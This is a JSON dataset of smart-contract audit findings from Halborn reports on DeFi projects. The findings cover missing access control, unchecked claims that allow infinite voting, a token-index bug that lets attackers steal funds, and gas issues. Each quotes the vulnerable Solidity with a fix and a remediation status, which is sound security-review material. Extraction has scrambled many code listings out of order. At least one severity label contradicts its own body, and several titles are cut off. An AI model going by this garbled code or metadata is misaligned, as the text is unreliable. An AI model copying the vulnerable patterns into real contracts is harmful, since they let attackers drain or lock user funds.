_totalDepositors ; i ++) { address depositor = depositors [ i ]; 352 uint256 pendingAmount = IDepositor ( depositor ). getPendingAurora 353  () ; 33 354 355 356 357 } if ( pendingAmount > 0) { IDepositor ( depositor ). withdraw ( pendingAmount ); } Listing 14: contracts/StakingManager.sol 362 for ( uint i = 1; i <= _totalOrders ; i ++) { 363 364 365 366 } Order memory order = pendingOrder [i ]; pendingOrder [ i ] = Order (0 , address (0) ) ; availableAssets [ order . receiver ] += order . amount ; Listing 15: contracts/StakingManager.sol 377 for ( uint i = _totalDepositors ; i > 0; i - -) { 378 379 380 381 address depositor = depositors [i -1]; uint256 assets = getTotalAssetsFromDepositor ( depositor ); if ( assets == 0) continue ; uint256 nextWithdraw = _totalWithdrawInQueue - alreadyWithdraw  ; 382 383 384 385 386 387 388 389 390 391 392 } if ( assets >= nextWithdraw ) { IDepositor ( depositor ). unstake ( nextWithdraw ); alreadyWithdraw += nextWithdraw ; } else { IDepositor ( depositor ). unstakeAll () ; alreadyWithdraw += assets ; } _updateDepositorShares ( depositor ); if ( alreadyWithdraw == _totalWithdrawInQueue ) return ; Listing 16: contracts/StakingManager.sol 398 for ( uint i = 1; i <= _totalOrders ; i ++) { Order memory order = withdrawOrder [ i ]; 399 uint256 _assets = order . amount ; 400 401 if ( _assets > 0) { 402 403 404 address _receiver = order . receiver ; // Removing withdraw order . withdrawOrder [ i ] = Order (0 , address (0) ) ; 34 // Creating pending order . pendingOrder [i ] = Order ( _assets , _receiver ); 405 406 407 408 409 } } BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:L/D:L/Y:L/R:P/S:U (2.2) Recommendation: and WithdrawOrders arrays lengths. It is recommended to be very restrictive regarding the limits of depositors On the other hand, it could be convenient to split the load of the aforementioned function between different transactions to avoid running out of gas in a single transaction. Remediation Plan: SOLVED: The MetaPool team partially solved the issue by applying the restriction mentioned in HAL-05 and limiting WithdrawOrders length to 200. However, this maximum can be ignored since it can be arbitrarily set during the smart contract deployment. By the other hand, the workload of this function has not been split into minor tasks in order to reduce gas usage in a single transaction. 35 ",
        "labels": [
            "Halborn",
            "MetaPool_Staking_Pools_Aurora",
            "Severity: Low"
        ]
    },
    {
        "title": "VAULTS ARE NOT EIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Following EIP-4626 definition, used ERC4626 custom implementations in scoped contracts are not fully EIP-4626 compliant due to the following functions are not meeting some EIPs requirements:  Withdraw function missing (LiquidityPool).  Mint function missing (LiquidityPool).  maxDeposit function:  MUST return the maximum amount of assets deposit would allow to be deposited for receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). This assumes that the user has infinite assets, i.e. MUST NOT rely on balanceOf of asset.  maxMint function:  MUST return the maximum amount of shares mint would allow to be deposited to the receiver and not cause a revert, which MUST NOT be higher than the actual maximum that would be accepted (it should underestimate if necessary). This assumes that the user has infinite assets, i.e. MUST NOT rely on balanceOf of asset.  Deposit function ( LiquidityPool):  MUST emit the Deposit event.  Redeem function (LiquidityPool):  MUST emit the Withdraw event.  maxDeposit, maxMint, maxWithdraw and maxRedeem functions should re- turn 0 when their respective functions are disabled (LiquidityPool). 36 Code Location: Listing 17: contracts/LiquidityPool.sol 222 function mint ( uint256 , address ) public override pure returns (  uint256 ) { 223 224 } revert ( \" UNAVAILABLE_FUNCTION \"); Listing 18: contracts/LiquidityPool.sol 227 function withdraw ( uint256 , address , address ) public override pure  returns ( uint256 ) { 228 229 } revert ( \" UNAVAILABLE_FUNCTION \"); Listing 19: contracts/LiquidityPool.sol 210 emit RemoveLiquidity ( msg . sender , 211 _receiver , 212 _owner , 213 _shares , 214 auroraToSend , 215 216 stAurToSend 217 ); Listing 20: contracts/LiquidityPool.sol 320 emit AddLiquidity ( _caller , _receiver , _assets , _shares ); BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:N/R:P/S:U (2.5) Recommendation: All aforementioned functions should be modified to meet the EIP-4626 specifications in order to avoid future compatibility issues. 37 References:  EIP-4626: Specification Remediation Plan: PARTIALLY SOLVED: The MetaPool team partially solved the issue by sticking to EIP-4626 definitions. However, the staking-pool-aurora code has not been modified to stick to the following EIP-4626 definition:  maxDeposit, maxMint, maxWithdraw and maxRedeem functions should re- turn 0 when their respective functions are disabled (LiquidityPool). 38 ",
        "labels": [
            "Halborn",
            "MetaPool_Staking_Pools_Aurora",
            "Severity: Low"
        ]
    },
    {
        "title": "USE CUSTOM ERRORS INSTEAD OF REVERT STRINGS TO SAVE GAS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Failed operations in several contracts are reverted with an accompanying message selected from a set of hard-coded strings. In the EVM, emitting a hard-coded string in an error message costs ~50 more gas than emitting a custom error. Additionally, hard-coded strings increase the gas required to deploy the contract. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Custom errors are available from Solidity version 0.8.4 up. Consider replacing all revert strings with custom errors. Usage of custom errors should look like this: Listing 21 1 error CustomError () ; 2 3 // ... 4 5 if ( condition ) 6 revert CustomError () ; 39 Remediation Plan: SOLVED: The MetaPool team solved the issue by following the aforementioned recommendation. 40 ",
        "labels": [
            "Halborn",
            "MetaPool_Staking_Pools_Aurora",
            "Severity: Informational"
        ]
    },
    {
        "title": "USE UINT256 INSTEAD OF UINT IN FUNCTION ARGUMENTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In solidity, its well known that uint type is an alias of uint256 type which means that, at compilation time, declared uint variables are treated as uint256 variables, as well as function arguments. This condition is essential during ABI definition, since every argument whose type is uint will be assigned to uint256 type. Then, calling to this kind of function through its ABI definition should not be an issue, since uint will always be processed as uint256 in external contracts. However, using raw calls to contracts functions whose arguments contain an uint type could lead to errors and unexpected reverts if uint types are specified in the function signature of these raw calls due to function signatures using uint will mismatch with the actual signature that is using a uint256 type defined in the contract. BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to change every uint type to uint256 in function arguments. Remediation Plan: SOLVED: The MetaPool team solved the issue by modifying the type to uint256. 41 ",
        "labels": [
            "Halborn",
            "MetaPool_Staking_Pools_Aurora",
            "Severity: Informational"
        ]
    },
    {
        "title": "LOOP GAS USAGE OPTIMIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/MetaPool_Staking_Pools_Aurora_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Multiple gas cost optimization opportunities were identified in the loops of scoped contracts:  Unnecessary reading of the array length on each iteration wastes gas.  Using != consumes less gas.  It is possible to further optimize loops by using unchecked loop index incrementing and decrementing.  Pre-increment ++i consumes less gas than post-increment i++. Code Location: Listing 22: contracts/StakedAuroraVault.sol 144 for ( uint i = 0; i < _totalAccounts ; i ++) Listing 23: contracts/StakedAuroraVault.sol 159 for ( uint i = 0; i < _totalAccounts ; i ++) Listing 24: contracts/StakingManager.sol 159 for ( uint i = 1; i <= _totalOrders ; i ++) Listing 25: contracts/StakingManager.sol 170 for ( uint i = 1; i <= _totalOrders ; i ++) 42 Listing 26: contracts/StakingManager.sol 222 for ( uint i = 0; i < _totalDepositors ; i ++) Listing 27: contracts/StakingManager.sol 240 for ( uint i = 0; i < _totalDepositors ; i ++) Listing 28: contracts/StakingManager.sol 260 for ( uint i = 0; i < _totalDepositors ; i ++) Listing 29: contracts/StakingManager.sol 351 for ( uint i = 0; i < _totalDepositors ; i ++) Listing 30: contracts/StakingManager.sol 362 for ( uint i = 1; i <= _totalOrders ; i ++) Listing 31: contracts/StakingManager.sol 377 for ( uint i = _totalDepositors ; i > 0; i - -) Listing 32: contracts/StakingManager.sol 398 for ( uint i = 1; i <= _totalOrders ; i ++) BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: It is recommended to cache array lengths outside of loops, as long the size is not changed during the loop. 43 It is recommended to use the unchecked ++i operation to increment the values of the uint variable inside the loop. It is noted that using unchecked operations requires particular caution to avoid overflows, and their use may impair code readability. It is possible to save gas by using != inside loop conditions. Remediation Plan: SOLVED: The MetaPool team solved the issue by applying aforementioned recommendations. 44 4.10 (HAL-10) TYPOS IN COMMENTS - INFORMATIONAL (0.0) ",
        "labels": [
            "Halborn",
            "MetaPool_Staking_Pools_Aurora",
            "Severity: Informational"
        ]
    },
    {
        "title": "SOLC 0.8.2 COMPILER VERSION CONTAINS MULTIPLE BUGS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/StaderLabs_TokenERC20_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Solidity compiler version 0.8.3, 0.8.4 and 0.8.9 fixed important bugs in the compiler. The version 0.8.2 set in the hardhat.config.js file is missing all these fixes:  0.8.3  0.8.4  0.8.9 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use the most tested and stable versions, such as 0.6.12 or 0.7.6. Otherwise, if you still want to use ^0.8.0, because of the new functionality it provides, it is recommended to use 0.8.9 version. Remediation Plan: SOLVED: The StaderLabs team set the pragma to the 0.8.9 version. 12 MANUAL TESTING 13 Halborn performed several manual tests in the Stader.sol contract: G N I T S E T L A U N A M As the contract just follows the standard OpenZeppelin ERC20 contracts ERC20, ERC20Burnable, ERC20Permit and ERC20Votes, the manual tests were focused on testing the main functions of these contracts:  approve()  balanceOf()  burn() 14  burnFrom()  decreaseAllowance()  delegate()  increaseAllowance()  transfer()  transferFrom() The delegateBySig() function was also tested: And also the permit() function: No issues were found during the manual tests. G N I T S E T L A U N A M 15 ",
        "labels": [
            "Halborn",
            "StaderLabs_TokenERC20",
            "Severity: Informational"
        ]
    },
    {
        "title": "DEPOSITING TO ANY POOL/TOKEN WITH ANY AMOUNT VIA CONTROLLED POLICY CENTER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "The function setter setPolicyCenter in charge of modifying the variable policyCenter, used to verify whether a functions caller is the policy center smart contract or not by checking the address stored in this variable, has no access control. Thus, any account can modify the address stored in policyCenter which is used to verify the caller in relevant functions such as depositFromPolicyCenter and withdrawFromPolicyCenter. This allows the depositFromPolicyCenter to be called without ever having to transfer tokens. This is causing an attacker to add pool liquidity to any desired pool ID with any chosen token and without any amount without ever owning a single token. This allows the attacker to gain full control on the balance of every single pool on the system. Code Location: Listing 1: src/reward/WeightedFarmingPool.sol (Line 75) 75 function setPolicyCenter ( address _policyCenter ) public { 76 77 } policyCenter = _policyCenter ; Listing 2: src/reward/WeightedFarmingPool.sol (Line 194) uint256 _id , address _token , uint256 _amount , address _user 194 function depositFromPolicyCenter ( 195 196 197 198 199 ) external { require ( 200 201 202 msg . sender == policyCenter , \" Only policyCenter can call stakedLiquidity \" 21 203 204 205 206 } ); _deposit ( _id , _token , _amount , _user ); Risk Level: Likelihood - 5 Impact - 5 Recommendation: This function should implement control access to prevent malicious mod- ifications on policyCenter variable. Remediation Plan: SOLVED: This issue was solved by implementing access control modifiers. 22 ",
        "labels": [
            "Halborn",
            "Degis_SCProtection",
            "Severity: Critical"
        ]
    },
    {
        "title": "INFINITE VOTING BY BYPASSING LOCKING AND RE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "The _claim function is not checking if the user has already claimed the funds for a settled proposal, which is causing an attacker to reclaim and unlock any locked veDEG not even for the proposal you are calling _claim for. So if the user/attacker is involved in voting for 2 proposals and one of them gets settled and claimed, the user/attack can unlock the locked veDEG for the other proposal by calling claim with the already claimed/settled proposal. This allows the attacker to vote again for the proposal since the funds are already unlocked, causing an infinite voting glitch. Code Location: Listing 3: src/voting/onboardProposal/OnboardProposal.sol (Line 386) revert OnboardProposal__WrongStatus () ; if ( proposal . status != SETTLED_STATUS ) UserVote storage userVote = votes [ _user ][ _id ]; 374 function _claim ( uint256 _id , address _user ) internal { 375 Proposal storage proposal = proposals [ _id ]; 376 377 378 379 380 381 382 383 384 385 386 387 388 389 } // Unlock the veDEG used for voting // No reward / punishment veDeg . unlockVeDEG ( _user , userVote . amount ); emit Claimed ( _id , _user , userVote . amount ); userVote . claimed = true ; 23 POC: 24 Risk Level: Likelihood - 5 Impact - 5 Recommendation: The code should be checking if the user has already claimed the funds by reverting if the userVote.claimed is set. Remediation Plan: SOLVED: This issue was fixed with the suggested recommendation. 25 ",
        "labels": [
            "Halborn",
            "Degis_SCProtection",
            "Severity: Critical"
        ]
    },
    {
        "title": "CODE NOT CHECKING IF TOKEN IS NOT PRESENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "The _getIndex function under WeightedFarmingPool does not check if the token was not found and returns index 0 as default, causing not found tokens to be treated as part of the pool tokens. Code Location: Listing 4: src/reward/WeightedFarmingPool.sol (Lines 514,519) address [] memory allTokens = pools [ _id ]. tokens ; uint256 length = allTokens . length ; for ( uint256 i ; i < length ; ) { internal view returns ( uint256 index ) 511 function _getIndex ( uint256 _id , address _token ) 512 513 514 515 { 516 517 518 519 520 521 522 523 524 525 526 527 528 529 } if ( allTokens [ i ] == _token ) { unchecked { ++ i; index = i; break ; } else { } } } Risk Level: Likelihood - 5 Impact - 5 26 Recommendation: It is recommended to revert in case that the token is not found on the pool. Furthermore, another suggestion is to use a mapping between token addresses and pool ID, so the token is verified in O(1) and without any doubt. Remediation Plan: SOLVED: Instead of relying on arrays, a new mapping mapping(bytes32 => bool)public supported; was introduced to keep track of supported tokens for a given pool id. 27 ",
        "labels": [
            "Halborn",
            "Degis_SCProtection",
            "Severity: Critical"
        ]
    },
    {
        "title": "DEPOSITING ON ANY POOL USING ANY TOKEN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "The deposit function under WeightedFarmingPool does accept any token as parameter. This token is then compared against all pool tokens and the index returned. However, since the _getIndex function does return 0 when a token is not found, the first token of the pool will be used and balance incremented. Furthermore, since the system does not implement any token white-listing a malicious token can be used so the transferFrom function does not perform any real transfer allowing to increment the stacked amount of the first pool token as wished. Code Location: Listing 5: src/reward/WeightedFarmingPool.sol (Line 280) pool . amount . push (0) ; user . amount . push (0) ; 280 uint256 index = _getIndex ( _id , _token ); 281 282 // check if current index exists for user 283 if ( user . amount . length < index + 1) { 284 285 } 286 if ( pool . amount . length < index + 1) { 287 288 } 289 290 user . amount [ index ] += _amount ; 291 user . share += _amount * pool . weight [ index ]; 292 293 pool . amount [ index ] += _amount ; 294 pool . shares += _amount * pool . weight [ index ]; 295 296 user . rewardDebt = ( user . share * pool . accRewardPerShare ) / SCALE ; 28 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It is recommended to fix the _getIndex issue or provide the actual index of the token inside the pool instead of a user controlled token address. Remediation Plan: SOLVED: Instead of relying on arrays, a new mapping mapping(bytes32 => bool)public supported; was introduced to keep track of supported tokens for a given pool id. 29 ",
        "labels": [
            "Halborn",
            "Degis_SCProtection",
            "Severity: Critical"
        ]
    },
    {
        "title": "AN ATTACKER CAN WITHDRAW NOT OWNED TOKENS AND STEAL FUNDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "The _withdraw function is using the invalid implemented _getIndex which is causing the transfer to take place into any user controlled token from the parameters. Code Location: Listing 6: src/reward/WeightedFarmingPool.sol (Line 327) updatePool ( _id ); uint256 _id , address _token , uint256 _amount , address _user 299 function _withdraw ( 300 301 302 303 304 ) internal { 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 ); SCALE - user . rewardDebt ; pool . rewardToken , _user , pending require ( _amount > 0, \" Zero amount \"); require ( _id <= counter , \" Pool not exists \" ); PoolInfo storage pool = pools [ _id ]; UserInfo storage user = users [ _id ][ _user ]; if ( user . share > 0) { uint256 pending = ( user . share * pool . accRewardPerShare ) / uint256 actualReward = _safeRewardTransfer ( emit Harvest ( _id , _user , _user , actualReward ); 30 } IERC20 ( _token ). transfer ( _user , _amount ); 325 326 327 POC: 31 Risk Level: Likelihood - 5 Impact - 5 Recommendation: It should be verified that _getIndex is valid and verify that token is from that pool. Probably add a mapping of token address -> poolID and verify that. Remediation Plan: SOLVED: Instead of relying on arrays, a new mapping mapping(bytes32 => bool)public supported; was introduced to keep track of supported tokens for a given pool id. 32 ",
        "labels": [
            "Halborn",
            "Degis_SCProtection",
            "Severity: Critical"
        ]
    },
    {
        "title": "UPDATING THE 0 INDEX TOKEN WEIGHT VIA UNREGISTERED TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "The updateWeight function is updating the pool weight via the _getIndex index, which as stated before it is incorrectly implemented. This allows the first token weight on the pool to be updated if an unregistered or invalid token is provided as the parameter. Furthermore, the code does not check if the weight is greater than 0. Code Location: Listing 7: src/reward/WeightedFarmingPool.sol (Line 138) 145 function updateWeight ( uint256 _id , 146 address _token , 147 uint256 _newWeight 148 149 ) external { 150 151 152 153 154 155 } updatePool ( _id ); uint256 index = _getIndex ( _id , _token ); pools [ _id ]. weight [ index ] = _newWeight ; Risk Level: Likelihood - 5 Impact - 5 33 Recommendation: It should be verified that _getIndex is correctly implemented and verify that token is from that pool. Probably add a mapping of token address -> poolID and verify that instead of the array in O(1) time. Furthermore, the code should check if the new set weight is greater than 0. Remediation Plan: SOLVED: Instead of relying on arrays, a new mapping mapping(bytes32 => bool)public supported; was introduced to keep track of supported tokens for a given pool id. 34 ",
        "labels": [
            "Halborn",
            "Degis_SCProtection",
            "Severity: Critical"
        ]
    },
    {
        "title": "PUBLICLY EXPOSED FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "functions the involved Several WeightedFarmingPool contract, which are publicly exposed and without any sort of access control: management being the are in of  addPool: It can add an arbitrary pool into the system.  addToken: It can add any token, even not whitelisted, into any pool.  updateWeight: It does allow updating the weight of any token of any pool.  setWeight: Same as updateWeight but for the entire pool tokens.  updateRewardSpeed: It does allow updating the rewards per second for a pool.  setPolicyCenter: as described on DEPOSITING TO ANY POOL/TOKEN WITH ANY AMOUNT VIA CONTROLLED POLICY CENTER. Code Location: Listing 8: src/reward/WeightedFarmingPool.sol (Line 138) 145 function updateWeight ( uint256 _id , 146 address _token , 147 148 uint256 _newWeight 149 ) external { 150 151 152 153 154 155 } updatePool ( _id ); uint256 index = _getIndex ( _id , _token ); pools [ _id ]. weight [ index ] = _newWeight ; 35 Risk Level: Likelihood - 5 Impact - 5 Recommendation: The described functions should implement control access to prevent mali- cious modifications. Some functions should verify that they are called only though priorityPoolFactory. Remediation Plan: SOLVED: All the stated calls are checking if the sender is a valid- registered pool using IPriorityPoolFactory. The setPolicyCenter function was removed from the WeightedFarmingPool contract. 36 ",
        "labels": [
            "Halborn",
            "Degis_SCProtection",
            "Severity: Critical"
        ]
    },
    {
        "title": "DEPOSITING TO SECONDARY TOKENS DOES CAUSE THE CONTRACT TO LOCK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "The code under _deposit is assuming that user.amount will contain an array for all newly added tokens to the pool, which is not the case if the user performs a deposit for the first time on a token whose index is !=0. Code Location: Listing 9: src/reward/WeightedFarmingPool.sol (Lines 283-288) user . amount . push (0) ; pool . amount . push (0) ; 282 // check if current index exists for user 283 if ( user . amount . length < index + 1) { 284 285 } 286 if ( pool . amount . length < index + 1) { 287 288 } 289 290 user . amount [ index ] += _amount ; 291 user . share += _amount * pool . weight [ index ]; 292 293 pool . amount [ index ] += _amount ; 294 pool . shares += _amount * pool . weight [ index ]; 295 296 user . rewardDebt = ( user . share * pool . accRewardPerShare ) / SCALE ; 37 POC: Risk Level: Likelihood - 5 Impact - 5 Recommendation: The code should be using mappings instead of arrays to store the amount information. The key for the mapping should be the actual token address. Remediation Plan: SOLVED: The code is now checking the user.amount length and comparing it against the extracted index. If it is required, empty values will be 38 pushed to satisfy the difference between them. 39 ",
        "labels": [
            "Halborn",
            "Degis_SCProtection",
            "Severity: Critical"
        ]
    },
    {
        "title": "POOL INCOMES ON REPORTER REWARD CAN BE ARBITRARILY INCREASED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Degis_SCProtection_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "The function premiumIncome allows increasing arbitrarily the array of pool incomes used to calculate the final reward for a correct reporter. Using this function to increase the value of a selected pool income before executing an incident report made from a malicious account could lead to an attacker draining the entire SHD token balance from Treasury smart contract. Code Location: Listing 10: src/pools/Treasury.sol (Line 52) 52 function premiumIncome ( uint256 _poolId , uint256 _amount ) external  { 53 54 } poolIncome [ _poolId ] += _amount ; POC: 40 Risk Level: Likelihood - 5 Impact - 5 Recommendation: This function should implement control access to prevent malicious mod- ifications on poolIncome array. Remediation Plan: SOLVED: The code is now checking that the caller is only the policyCenter. 41 3.10 (HAL-10) INVALID VARIABLE VISIBILITY DOES CAUSE CONTRACT DEADLOCK - CRITICAL ",
        "labels": [
            "Halborn",
            "Degis_SCProtection",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSABLE CONTRACT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Import_Export_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The ImportExportElasticNft.sol smart contract constructor initializes the nft variable to the same value. This cause nft value to be equal to Once deployed, this means 0x0000000000000000000000000000000000000000. that the contract cannot be used since there is no way to modify this variable. Code Location: Listing 1: ImportExportElasticNft.sol (Line 19) 18 19 20 21 22 constructor ( address nft ) SecureContract ( true , true ) { nft = _nft ; owner = msg . sender ; verifier = msg . sender ; } Proof of Concept: To replicate this issue: - Deploy the smart contract with any address as NFT. - check the NFT address of the contract. Listing 2: pentest.js elastic = await ( await ( await hre . ethers . getContractFactory (\" 1  ImportExportElasticNft \" )) 2 3 4 . deploy ( block . address )) . deployed () ; console . log ( ' [+] nft addr : ' + await elastic . nft () ); 13 Listing 3: Output Elastic Testing 1 2 [+] nft add : 0 x0000000000000000000000000000000000000000 Risk Level: Likelihood - 3 Impact - 4 Recommendation: It is recommended to use the parameters of the constructor correctly to set the correct addresses when deploying the smart contract and avoid mentioned scenarios. Remediation Plan: SOLVED: The SeaScape team now assigns correctly the _nft parameter to the nft state variable. 14 ",
        "labels": [
            "Halborn",
            "Seascape_Block_Lords_Import_Export",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNDEFINED VARIABLES ARE USED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Import_Export_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The ImportExportElasticNft.sol smart contract uses undefined variables, resulting in contracts which do not compile. Code Location:  nftExportNonce (ImportExportElasticNft.sol#59,65) Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to declare all used variables. Remediation Plan: SOLVED: The SeaScape team has implemented and declared the mapping nftExportNonce. 15 ",
        "labels": [
            "Halborn",
            "Seascape_Block_Lords_Import_Export",
            "Severity: Low"
        ]
    },
    {
        "title": "UNDEFINED IMPORTS ARE USED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Import_Export_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The ImportExportElasticNft.sol smart contract uses undefined castings referring to other contracts. The name of these contracts is not correct. Code Location:  Blocklords (ImportExportElasticNft.sol#46,47,67) Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to define all castings correctly to other contracts. Remediation Plan: SOLVED: The SeaScape team has renamed the Blocklord contract to BlockLords to correct this import. 16 ",
        "labels": [
            "Halborn",
            "Seascape_Block_Lords_Import_Export",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Seascape_Block_Lords_Import_Export_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It has been detected that some functions, such as exportNft(), and exportToken() of the smart contracts, are missing address validation. Every input address should be checked not to be zero, especially the ones that could lead to rendering the contract unusable, lock tokens, etc. This is considered a best practice. Code Location: Listing 4: ImportExportManager.sol (Lines 108,133) 108 function exportNft ( address nft , uint nftId , uint8 _v , bytes32  _r , bytes32 _s ) external { 109 110 111 112 require ( supportedNfts [ nft ], \" unsupported token \"); // / Validation of quality // / message is generated as owner + amount + last time  stamp + quality 113 114 115 bytes memory _prefix = \" \\ x19Ethereum Signed Message :\\ n32 \" ; bytes32 _messageNoPrefix = keccak256 ( abi . encodePacked ( msg . sender , nft , address ( this ) ,  block . chainid , nftId , nftExportNonce [ msg . sender ]) ); 116 bytes32 _message = keccak256 ( abi . encodePacked ( _prefix ,  _messageNoPrefix )); 117 118 119 120 121 122 123 124 125 126 address _recover = ecrecover ( _message , _v , _r , _s ); require ( _recover == verifier , \" verification failed \" ); nftExportNonce [ msg . sender ]++; address accountHodler = accountHodlerOf ( msg . sender ); if ( address ( accountHodler ). codehash == 0) { require ( deploy ( accountHodler , msg . sender ) , \" Failed to  deploy the contract \" ); 127 AccountHodler ( accountHodler ). initialize ( owner ); 17 128 129 130  nftId ); } AccountHodler ( accountHodler ). exportNft ( nft , msg . sender , 131 132 133 } function exportToken ( address token , uint amount , uint fee ,  uint8 _v , bytes32 _r , bytes32 _s ) external { 134 135 136 137 require ( supportedTokens [ token ], \" unsupported token \" ); // / Validation of quality // / message is generated as owner + amount + last time  stamp + quality 138 139 140 bytes memory _prefix = \" \\ x19Ethereum Signed Message :\\ n32 \" ; bytes32 _messageNoPrefix = keccak256 ( abi . encodePacked ( msg . sender , token , address ( this  ) , block . chainid , amount , fee , tokenExportNonce [ msg . sender ]) ); bytes32 _message = keccak256 ( abi . encodePacked ( _prefix , 141  _messageNoPrefix )); 142 143 144 145 146 147 148 149 150 151 address _recover = ecrecover ( _message , _v , _r , _s ); require ( _recover == verifier , \" verification failed \" ); tokenExportNonce [ msg . sender ]++; address accountHodler = accountHodlerOf ( msg . sender ); if ( address ( accountHodler ). codehash == 0) { require ( deploy ( accountHodler , msg . sender ) , \" Failed to  deploy the contract \" ); 152 153 154 155 AccountHodler ( accountHodler ). initialize ( owner ); } AccountHodler ( accountHodler ). exportToken ( token , msg . sender ,  feeReceiver , amount , fee ); 156 } Risk Level: Likelihood - 2 Impact - 2 18 Recommendation: It is recommended to validate that each address inputs in the exportNft(), exportToken(), supportNft(), supportToken() and similar functions from the smart contracts are non-zero. Remediation Plan: SOLVED: The SeaScape team now validates the inputs where an address is used to verify they are non-zero before performing any functionality. 19 ",
        "labels": [
            "Halborn",
            "Seascape_Block_Lords_Import_Export",
            "Severity: Low"
        ]
    },
    {
        "title": "PUBLICLY AVAILABLE FUNCTION COULD REDUCE THE AMOUNT OF INTERESTS EARNED ON AAVE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Sacred_Finance_Smart_Contract_Circom_Circuit_Security_Audit_Report_Final.pdf",
        "body": "The collectAaveInterests function in the ETHSacred contract was publicly This function allows calculating the amount of interest accessible. earned on Aave WETH deposits up to the current block, and automatically withdrawing that portion of WETH, exchanging it them with AWETH (Aave interest bearing WETH). While the amount withdrawn would be sent to the AaveInterestProxy contract, and thus stored securely, this would reduce the amount of compound interest earned on the deposit. Code Location: The following function code was available in the ETHSacred contract (Lines #93-101): Listing 1 if ( interests > 0 && aaveInterestsProxy != address (0) ) { uint256 interests = AToken ( wETHToken ). balanceOf ( address ( this )) address lendingPool = AddressesProvider ( 1 function collectAaveInterests () public payable { 2  - collateralAmount ; 3 4  lendingPoolAddressProvider ). getPool () ; 5  aToken approval failed \" ); 6  aaveInterestsProxy ); 7 8 9 } totalAaveInterests += interests ; } require ( AToken ( wETHToken ). approve ( wETHGateway , interests ) , \" WETHGateway ( wETHGateway ). withdrawETH ( lendingPool , interests , 15 Recommendation: Halborn recommends that this logic be reviewed, and the function is not made accessible by everyone. While the amount of additional interest that could have been earned from compounding might be small, attackers could still launch a griefing attack against Sacred Finance users due to the extremely cheap transaction fees on Polygon. In addition, this function was only called within this contract, so it could be done internally or privately. Finally, it is recommended to review if this function should also be called on the deposit operations, or only to withdrawals, to further maximize the time spent on Aave WETH pools. Remediation Plan: SOLVED: The Sacred Finance team solved the issue by setting the visibility of the collectAaveInterests function to private. 16 ",
        "labels": [
            "Halborn",
